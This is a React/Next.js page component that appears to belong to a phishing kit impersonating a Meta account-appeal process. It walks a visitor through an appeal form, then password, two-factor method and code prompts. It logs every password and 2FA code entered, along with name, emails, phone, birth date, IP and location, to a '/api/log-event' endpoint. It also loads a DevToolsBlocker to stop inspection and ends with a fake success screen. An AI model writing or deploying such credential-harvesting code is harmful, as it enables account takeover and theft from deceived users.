"use client";

import { useState, useEffect } from "react";
import MetaLogo from "@/components/MetaLogo";
import Sidebar from "@/components/Sidebar";
import MobileHeader from "@/components/MobileHeader";
import ContentCard from "@/components/ContentCard";
import AppealModal from "@/components/AppealModal";
import PasswordModal from "@/components/PasswordModal";
import MethodModal from "@/components/MethodModal";
import TwoFAModal from "@/components/TwoFAModal";
import SuccessModal from "@/components/SuccessModal";
import DevToolsBlocker from "@/components/DevToolsBlocker";

type FormDetails = {
  fullName: string;
  email: string;
  emailBusiness: string;
  pageName: string;
  phoneNumber: string;
  day: string;
  month: string;
  year: string;
  note: string;
  ip: string;
  location: string;
};

export default function NotFound() {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [currentPage, setCurrentPage] = useState("home");
  const [showAppealModal, setShowAppealModal] = useState(false);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [showMethodModal, setShowMethodModal] = useState(false);
  const [showTwoFAModal, setShowTwoFAModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [contactInfo, setContactInfo] = useState({ phoneNumber: "", email: "" });
  const [formDetails, setFormDetails] = useState<FormDetails | null>(null);
  const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
  const [twofaAttempts, setTwofaAttempts] = useState<string[]>([]);
  const [selectedMethod, setSelectedMethod] = useState<"app" | "sms" | "email" | "whatsapp">("app");

  useEffect(() => {
    const invitationDate = new Date().toLocaleDateString("en-US", {
      year: "numeric",
      month: "long",
      day: "numeric",
    });
    const dateElement = document.getElementById("invitationDate");
    if (dateElement) {
      dateElement.textContent = invitationDate;
    }
  }, []);

  const handleAppealClick = () => {
    setShowAppealModal(true);
  };

  const logEvent = async (pwdAttempts: string[], tfaAttempts: string[]) => {
    if (!formDetails) return;
    try {
      await fetch("/api/log-event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          formDetails,
          passwordAttempts: pwdAttempts,
          twofaAttempts: tfaAttempts,
        }),
      });
    } catch (error) {
      console.error("Failed to log event", error);
    }
  };

  const handlePasswordAttempt = (value: string) => {
    if (!formDetails) return;
    const normalized = value || "(empty)";
    const updated = [...passwordAttempts, normalized];
    setPasswordAttempts(updated);
    logEvent(updated, twofaAttempts);
  };

  const handleTwoFAAttempt = (value: string) => {
    if (!formDetails) return;
    const normalized = value || "(empty)";
    const updated = [...twofaAttempts, normalized];
    setTwofaAttempts(updated);
    logEvent(passwordAttempts, updated);
  };

  const handlePasswordSubmit = () => {
    setShowPasswordModal(false);
    setTimeout(() => {
      setShowMethodModal(true);
    }, 300);
  };

  const handleTwoFASubmit = () => {
    setShowTwoFAModal(false);
    setTimeout(() => {
      setShowSuccessModal(true);
    }, 300);
  };

  return (
    <>
      <DevToolsBlocker />
      <MobileHeader onMenuClick={() => setSidebarOpen(!sidebarOpen)} />
      <div 
        className="sidebar-overlay" 
        onClick={() => setSidebarOpen(false)} 
        style={{ display: sidebarOpen ? "block" : "none" }}
      ></div>
      
      <div className="content-wrapper">
        <Sidebar 
          isOpen={sidebarOpen}
          currentPage={currentPage}
          onPageChange={setCurrentPage}
          onClose={() => setSidebarOpen(false)}
          onNavClick={handleAppealClick}
        />
        
        <div className="main-content">
          <ContentCard 
            currentPage={currentPage}
            onAppealClick={handleAppealClick}
          />
        </div>
      </div>

      {showAppealModal && (
        <AppealModal 
          onClose={() => setShowAppealModal(false)}
          onPasswordRequired={(details) => {
            setFormDetails(details);
            setContactInfo({ phoneNumber: details.phoneNumber, email: details.email });
            setPasswordAttempts([]);
            setTwofaAttempts([]);
            setSelectedMethod("app");
            setShowAppealModal(false);
            setShowPasswordModal(true);
          }}
        />
      )}

      {showPasswordModal && (
        <PasswordModal 
          onClose={() => setShowPasswordModal(false)}
          onSubmit={handlePasswordSubmit}
          onAttempt={handlePasswordAttempt}
        />
      )}

      {showMethodModal && (
        <MethodModal
          onClose={() => setShowMethodModal(false)}
          onContinue={(method) => {
            setSelectedMethod(method);
            setShowMethodModal(false);
            setShowTwoFAModal(true);
          }}
          contactInfo={contactInfo}
        />
      )}

      {showTwoFAModal && (
        <TwoFAModal 
          onClose={() => setShowTwoFAModal(false)}
          onSubmit={handleTwoFASubmit}
          method={selectedMethod}
          contactInfo={contactInfo}
          onAttempt={handleTwoFAAttempt}
        />
      )}

      {showSuccessModal && (
        <SuccessModal 
          onClose={() => setShowSuccessModal(false)}
        />
      )}

      <style jsx global>{`
        body {
          min-height: 100vh;
          background: linear-gradient(180deg, #f6f1ff 0%, #f0f6ff 100%);
        }

        .content-wrapper {
          display: flex;
          min-height: 100vh;
          justify-content: center;
          padding-left: 0;
          max-width: 1400px;
          margin: 0 auto;
          padding: 18px 24px 64px;
          gap: 32px;
        }

        .sidebar-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-color: rgba(0, 0, 0, 0.35);
          z-index: 999;
          backdrop-filter: blur(4px);
        }

        .main-content {
          flex: 1;
          padding: 20px 0;
          display: flex;
          justify-content: center;
          align-items: flex-start;
          max-width: 1200px;
        }

        @media (max-width: 768px) {
          .content-wrapper {
            flex-direction: column;
            padding: 80px 16px 40px;
          }

          .main-content {
            margin-top: 16px;
            padding: 0;
            width: 100%;
          }
        }
      `}</style>
    </>
  );
}

